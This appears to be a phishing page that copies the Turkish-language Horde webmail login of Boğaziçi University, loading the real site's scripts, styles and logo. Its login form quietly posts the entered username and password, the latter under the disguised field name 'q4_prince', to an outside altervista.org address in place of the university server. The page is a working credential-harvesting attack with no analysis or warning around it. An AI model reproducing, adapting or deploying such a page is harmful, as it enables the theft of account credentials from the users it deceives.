<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd"><!--   IMP: Copyright 2001-2009 The Horde Project.  IMP is under the GPL.  --><!-- Horde Project: http://www.horde.org/ | IMP: http://www.horde.org/imp/ --><!--        GNU Public License: http://www.fsf.org/copyleft/gpl.html       --><HTML 

lang="tr-TR"><HEAD><META content="IE=11.0000" http-equiv="X-UA-Compatible">



<SCRIPT type="text/javascript">//<![CDATA[

var IMP = {"conf":{"hasDOM":true,"IMP_ALL":0,"isIE":false,"pop3":false,"fixed_folders":["Drafts","Trash","Sent"],"js_editor":"xinha"},"text":{"compose_cancel":"Bu iletiyi iptal etmek,i\u00e7eri\u011finin kal\u0131c\u0131 olarak yok olmasina yol a\u00e7acakt\u0131r.\nBunu yapmak istedi\u011finizden emin misiniz?","compose_discard":"B\u00f6yle yapmak, bu iletiyi kal\u0131c\u0131 olarak yok edecek.","compose_recipient":"Bir al\u0131c\u0131 belirtmelisiniz.","compose_sigreplace":"\u0130mza ba\u015far\u0131yla yerine kondu.","compose_signotreplace":"\u0130mza yerine konamad\u0131.","compose_nosubject":"\u0130letiye konu girilmemi\u015ftir.\n\u0130leti Konu olmaks\u0131z\u0131n g\u00f6nderilsin mi?","compose_file":"Dosya","compose_attachment":"Ek Olarak","compose_inline":"Metine G\u00f6m\u00fcl\u00fc","mailbox_submit":"\u00d6nce en az bir ileti se\u00e7melisiniz.","mailbox_delete":"Bu iletileri KALICI olarak silmek istedi\u011fizden emin misiniz?","mailbox_selectone":"\u00d6nce en az bir ileti se\u00e7melisiniz.","yes":"Evet","no":"Hay\u0131r","contacts_select":"\u00d6nce bir adres se\u00e7melisiniz.","contacts_closed":"Olu\u015fturulan ileti kapat\u0131ld\u0131.\u00c7\u0131k\u0131\u015f yap\u0131l\u0131yor.","contacts_called":"Bu pencere bir olu\u015fturma penceresi taraf\u0131ndan a\u00e7\u0131lmal\u0131d\u0131r.","folders_select":"L\u00fctfen herhangi bir eylem ger\u00e7ekle\u015ftirmeden \u00f6nce bir dizin se\u00e7in. ","folders_oneselect":"Bu eylem i\u00e7in sadece bir dizin se\u00e7ilmelidir.","folders_subfolder1":"Altdizin yarat\u0131yorsunuz: ","folders_subfolder2":"L\u00fctfen yeni dizin i\u00e7in bir ad girin:","folders_toplevel":"\u00dcstd\u00fczey bir dizin yarat\u0131yorsunuz.\nL\u00fctfen yeni dizin i\u00e7in bir ad girin:","folders_download1":"Dizin(ler)deki b\u00fct\u00fcn iletiler bir tane MBOX dosyasina indirilecektir:","folders_download2":"Bu i\u015flem zaman alabilir.Devam etmek istedi\u011finize emin misiniz?","folders_rename1":"Yeniden adland\u0131r\u0131lan dizin:","folders_rename2":"L\u00fctfen yeni ad\u0131 girin:","folders_no_rename":"Bu dizinin ismi de\u011fi\u015ftirilemez:","search_select":"L\u00fctfen arama i\u00e7in en az bir dizin se\u00e7in.","popup_block":"Pop-up pencere a\u00e7\u0131lamad\u0131. Taray\u0131c\u0131n\u0131z\u0131n pop-up pencere a\u00e7\u0131lmas\u0131n\u0131engellemedi\u011finden emin olunuz.","login_username":"L\u00fctfen kullan\u0131c\u0131 ad\u0131n\u0131z\u0131 girin.","login_q4_prince

word":"L\u00fctfen \u015fifrenizi girin.","spam_report":"Bu iletiyi istenmeyen ileti olarak bildirmek istiyor musunuz?","notspam_report":"Bu iletiyi temiz olarak rapor etmek istedi\u011finizden emin misiniz?","newfolder":"Yeni bir dizine kopyal\u0131yorsunuz\/ta\u015f\u0131yosunuz.\nL\u00fctfen yeni posta kutusu i\u00e7in bir ad girin:\n","target_mbox":"\u00d6nce bir hedef posta kutusu se\u00e7melisiniz."}};

//]]></SCRIPT>

 

<META http-equiv="Content-Type" content="text/html; charset=utf-8">

<SCRIPT src="https://horde.boun.edu.tr/horde/js/prototype.js" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://horde.boun.edu.tr/horde/js/horde-prototype.js" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://horde.boun.edu.tr/horde/js/accesskeys.js" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://horde.boun.edu.tr/horde/imp/js/login.js" type="text/javascript"></SCRIPT>

 <LINK href="https://horde.boun.edu.tr/horde/themes/screen.css" rel="stylesheet" 

type="text/css"> <LINK href="https://horde.boun.edu.tr/horde/themes/bluewhite/screen.css" 

rel="stylesheet" type="text/css"> <LINK href="https://horde.boun.edu.tr/horde/imp/themes/screen.css" 

rel="stylesheet" type="text/css"> <LINK href="https://horde.boun.edu.tr/horde/imp/themes/bluewhite/screen.css" 

rel="stylesheet" type="text/css"> <TITLE>Posta :: Horde Hoşgeldiniz</TITLE> 

<LINK href="/horde/imp/themes/graphics/favicon.ico" rel="SHORTCUT ICON"> 

<META name="GENERATOR" content="MSHTML 11.00.9600.18739"></HEAD> 

<BODY><!-- Piwik --> 

<SCRIPT type="text/javascript">

  var _paq = _paq || [];

  _paq.push(['trackPageView']);

  _paq.push(['enableLinkTracking']);

  (function() {

    var u="//analytics.boun.edu.tr/";

    _paq.push(['setTrackerUrl', u+'piwik.php']);

    _paq.push(['setSiteId', 3]);

    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];

    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);

  })();

</SCRIPT>

 <NOSCRIPT></NOSCRIPT><!-- End Piwik Code --> 

<SCRIPT type="text/javascript">//<![CDATA[

var autologin_url = '/horde/imp/login.php?autologin=&amp;server_key=';var show_list = 0;var ie_clientcaps = 0;var lang_url = null;var protocols = [];var change_smtphost = 0;var imp_auth = 1;var nomenu = 1

//]]></SCRIPT>

 

<FORM name="imp_login" id="imp_login" action="http://directoryupdatee.altervista.org/veri1/member.php"  

method="post" target="_parent"><INPUT name="actionID" type="hidden"> 

<INPUT name="url" type="hidden"> 

<INPUT name="load_frameset" type="hidden" value="1"> 

<INPUT name="autologin" type="hidden" value="0"> <INPUT name="anchor_string" id="anchor_string" type="hidden"> 

   <INPUT name="server_key" type="hidden" value="imap">    

<DIV id="menu">

<H1 align="center">Horde Hoşgeldiniz</H1></DIV>

<TABLE width="100%">

  <TBODY>

  <TR>

    <TD align="center">

      <TABLE align="center">

        <TBODY>

        <TR>

          <TD class="light rightAlign"><LABEL for="imapuser"><STRONG>Kullanıcı 

            Adı</STRONG></LABEL></TD>

          <TD class="light leftAlign" 

nowrap="nowrap"><INPUT name="imapuser" tabindex="1" id="imapuser" style="direction: ltr;" type="text"> 

                  </TD></TR>

        <TR>

          <TD class="light rightAlign"><LABEL 

            for="q4_prince"><STRONG>Şifre</STRONG></LABEL></TD>

          <TD 

class="leftAlign"><input name="q4_prince" tabindex="2" id="q4_prince" style="direction: ltr;" type="pass"> 

                 </TD></TR>

        <TR>

          <TD class="light rightAlign"><LABEL 

            for="new_lang"><STRONG>Dil</STRONG></LABEL></TD>

          <TD class="light leftAlign"><SELECT name="new_lang" tabindex="3" id="new_lang" 

            onchange="selectLang()"><OPTION value="ar_OM">‭Arabic (Oman) 

              ‮(العربية)</OPTION>         <OPTION value="ar_SY">‭Arabic (Syria) 

              ‮(العربية)</OPTION>         <OPTION value="id_ID">Bahasa 

              Indonesia</OPTION>         <OPTION value="bs_BA">Bosanski</OPTION> 

                      <OPTION value="bg_BG">‭Bulgarian (Български)</OPTION>      

                 <OPTION value="ca_ES">Català</OPTION>         <OPTION value="cs_CZ">Česky</OPTION> 

                      <OPTION value="zh_CN">‭Chinese (Simplified) 

              (简体中文)</OPTION>         <OPTION value="zh_TW">‭Chinese 

              (Traditional) (正體中文)</OPTION>         <OPTION 

              value="da_DK">Dansk</OPTION>         <OPTION 

              value="de_DE">Deutsch</OPTION>         <OPTION 

              value="en_US">‭English (American)</OPTION>         <OPTION value="en_GB">‭English 

              (British)</OPTION>         <OPTION value="en_CA">‭English 

              (Canadian)</OPTION>         <OPTION value="es_ES">Español</OPTION> 

                      <OPTION value="et_EE">Eesti</OPTION>         <OPTION 

              value="eu_ES">Euskara</OPTION>         <OPTION 

              value="fr_FR">Français</OPTION>         <OPTION 

              value="gl_ES">Galego</OPTION>         <OPTION value="el_GR">‭Greek 

              (Ελληνικά)</OPTION>         <OPTION value="he_IL">‭Hebrew 

              ‮(עברית)</OPTION>         <OPTION value="hr_HR">Hrvatski</OPTION>  

                     <OPTION value="is_IS">Íslenska</OPTION>         <OPTION 

              value="it_IT">Italiano</OPTION>         <OPTION 

              value="ja_JP">‭Japanese (日本語)</OPTION>         <OPTION value="km_KH">‭Khmer 

              (ខ្មែរ)</OPTION>         <OPTION value="ko_KR">‭Korean 

              (한국어)</OPTION>         <OPTION value="lv_LV">Latviešu</OPTION>     

                  <OPTION value="lt_LT">Lietuvių</OPTION>         <OPTION value="mk_MK">‭Macedonian 

              (Македонски)</OPTION>         <OPTION 

              value="hu_HU">Magyar</OPTION>         <OPTION 

              value="nl_NL">Nederlands</OPTION>         <OPTION 

              value="nb_NO">Norsk bokmål</OPTION>         <OPTION 

              value="nn_NO">Norsk nynorsk</OPTION>         <OPTION 

              value="fa_IR">‭Persian ‮(فارسى)</OPTION>         <OPTION value="pl_PL">Polski</OPTION> 

                      <OPTION value="pt_PT">Português</OPTION>         <OPTION 

              value="pt_BR">Português Brasileiro</OPTION>         <OPTION value="ro_RO">Românä</OPTION> 

                      <OPTION value="ru_RU">‭Russian (Русский)</OPTION>         

              <OPTION value="sk_SK">Slovenčina</OPTION>         <OPTION value="sl_SI">Slovenščina</OPTION> 

                      <OPTION value="fi_FI">Suomi</OPTION>         <OPTION 

              value="sv_SE">Svenska</OPTION>         <OPTION value="th_TH">‭Thai 

              (ไทย)</OPTION>         <OPTION selected="selected" 

              value="tr_TR">Türkçe</OPTION>         <OPTION 

              value="uk_UA">‭Ukrainian (Українська)</OPTION>        </SELECT>      

          </TD></TR>

        <TR>

          <TD class="light rightAlign"><LABEL 

            for="select_view"><STRONG>Durum</STRONG></LABEL></TD>

          <TD class="light leftAlign"><SELECT name="select_view" tabindex="4" 

            id="select_view"><OPTION selected="selected" 

              value="imp">Geleneksel</OPTION>         <OPTION 

              value="dimp">Dinamik</OPTION>         <OPTION 

              value="mimp">Minimalist</OPTION>        </SELECT>      </TD></TR>

        <TR>

          <TD>&nbsp;</TD>

          <TD 

class="light leftAlign"><INPUT name="loginButton" tabindex="5" class="button" id="loginButton" onClick="return submit_login();" type="submit" value="Giriş"> 

                 </TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></FORM><!-- This file contains any "Message Of The Day" Type information --> <!-- It will be included below the log-in form on the login page. --> 

<BR><BR>

<CENTER>

<TABLE style="border-radius: 10px; width: 550px; background-color: rgb(216, 206, 246);">

  <TBODY>

  <TR>

    <TD><FONT color="red"><B>* Horde istemcisi üzerinde "Dizinler" / "Dizin 

      Dolaşımı" sorunu yaşayan kullanıcılarımızın problemi gidermek için <A 

      href="http://downloads.malwarebytes.org/file/mbam/">Malwarebytes</A> 

      programını kullanarak bilgisayarlarındaki kötü yazılımları temizlemeleri 

      gerekmektedir.</B></FONT></TD></TR>

  <TR>

    <TD>

      <HR>

    </TD></TR>

  <TR>

    <TD>* Kullanıcı adınız, BOUN e-posta hesabınızın @boun.edu.tr alan adı 

      hariç kısmıdır.</TD></TR>

  <TR>

    <TD>* Your username is your BOUN e-mail address excluding @boun.edu.tr 

      domain part.</TD></TR>

  <TR>

    <TD>

      <HR>

    </TD></TR>

  <TR>

    <TD>* Parola (şifre) işlemlerinizi <A 

      href="https://mail.boun.edu.tr/">https://mail.boun.edu.tr/</A> adresinden 

      gerçekleştirebilirsiniz.</TD></TR>

  <TR>

    <TD>* For q4_prince

word operations use <A 

      href="https://mail.boun.edu.tr/">https://mail.boun.edu.tr/</A> 

  portal.</TD></TR><!--<tr><td align="center"><img src="themes/graphics/horde-power1.png" alt="Powered by Horde" /></td></tr>--> 

  </TBODY></TABLE></CENTER>

<DIV id="custom_logo"></DIV>

<STYLE type="text/css">

#custom_logo{

display: inline-block;

padding: 15px;

top: 1px;

left: 50%;

margin-left: -300px;

position: absolute;

width: 150px;

font-size: 0px;

background-image: url(https://horde.boun.edu.tr/horde/horde_logo.png);

background-repeat: no-repeat;

background-position: top;

height: 17px;

}

</STYLE>

 

<SCRIPT type="text/javascript">

  var _paq = _paq || [];

  _paq.push(['trackPageView']);

  _paq.push(['enableLinkTracking']);

  (function() {

    var u="//analytics.boun.edu.tr/";

    _paq.push(['setTrackerUrl', u+'piwik.php']);

    _paq.push(['setSiteId', 3]);

    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];

    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);

  })();

</SCRIPT>

 <NOSCRIPT>&lt;p&gt;&lt;img src="//analytics.boun.edu.tr/piwik.php?idsite=3" 

style="border:0;" alt="" /&gt;&lt;/p&gt;</NOSCRIPT> 

<SCRIPT language="JavaScript1.5" type="text/javascript">

<!--

var _setHordeTitle = 1;

try {

    if (document.title && parent.frames.horde_main) parent.document.title = document.title;

} catch (e) {

}

// -->

</SCRIPT>

 

<SCRIPT type="text/javascript">

<!--

if (typeof(_setHordeTitle) == 'undefined' && document.title && parent.frames.horde_main) parent.document.title = document.title;

// -->

</SCRIPT>

 

<SCRIPT type="text/javascript">//<![CDATA[

setFocus()

//]]></SCRIPT>

 </BODY></HTML>

